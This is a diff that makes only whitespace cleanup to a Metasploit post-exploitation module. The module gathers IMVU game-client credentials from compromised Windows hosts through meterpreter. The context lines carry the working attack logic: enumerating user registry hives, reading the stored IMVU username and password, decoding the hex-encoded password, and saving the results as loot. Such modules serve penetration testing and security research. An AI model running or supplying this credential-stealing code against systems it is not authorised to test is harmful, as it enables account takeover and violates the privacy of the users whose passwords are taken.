@@ -11,7 +11,7 @@
 
 
 
-require 'msf/core' 
+require 'msf/core'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/user_profiles'
 
@@ -21,9 +21,8 @@ class Metasploit3 < Msf::Post
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::UserProfiles
 
-
 	def initialize(info = {})
-		super(update_info(info, 
+		super(update_info(info,
 			'Name'           => 'Post Windows Gather Credentials IMVU Game Client',
 			'Description'    => %q{
 				This module extracts account username & password from the IMVU game client
@@ -33,8 +32,8 @@ class Metasploit3 < Msf::Post
 				[
 				'Shubham Dawra <shubham2dawra[at]gmail.com>' # www.SecurityXploded.com
 				],
-			'License'        => MSF_LICENSE, 
-			'Version'        => '$Revision: 14100 $', 
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 14100 $',
 			'Platform' => [ 'windows' ],
 			'SessionTypes' => [ 'meterpreter' ]
 		))
@@ -42,7 +41,6 @@ class Metasploit3 < Msf::Post
 
 
 	def run
-
 		creds = Rex::Ui::Text::Table.new(
 			'Header' => 'IMVU Credentials',
 			'Indent' => 1,
@@ -51,18 +49,16 @@ class Metasploit3 < Msf::Post
 				'Password'
 			]
 		)
-
 		credcount=0
 		userhives=load_missing_hives()
 		userhives.each do |hive|
 			next if hive['HKU'] == nil
-
 			print_status("Looking at Key #{hive['HKU']}") if datastore['VERBOSE']
 			subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\IMVU\\")
 			if subkeys.nil? or subkeys.empty?
 				print_status ("IMVU not installed for this user.")
 				next
-			end 
+			end
 			user = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\username\\", "")
 			hpass = registry_getvaldata("#{hive['HKU']}\\Software\\IMVU\\password\\", "")
 			decpass = [ hpass.downcase.gsub(/'/,'').gsub(/\\?x([a-f0-9][a-f0-9])/, '\1') ].pack("H*")
@@ -75,7 +71,7 @@ class Metasploit3 < Msf::Post
 		unload_our_hives(userhives)
 		print_status("#{credcount} Credentials were found.")
 
-		if credcount > 0 
+		if credcount > 0
 			print_status("Storing data...")
 			path = store_loot(
 				'imvu.user.creds',
@@ -88,7 +84,5 @@ class Metasploit3 < Msf::Post
 
 			print_status("IMVU user credentials saved in: #{path}")
 		end
-
 	end
-
 end
